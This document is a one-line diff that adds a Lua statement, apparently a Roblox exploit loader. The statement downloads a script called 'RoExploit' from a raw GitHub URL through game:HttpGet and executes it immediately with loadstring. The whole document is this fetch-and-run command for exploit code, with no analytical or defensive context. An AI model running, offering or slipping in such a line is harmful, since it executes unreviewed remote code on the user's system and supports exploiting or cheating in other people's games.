@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/drissez1/RoExploit/main/Roexp'))()
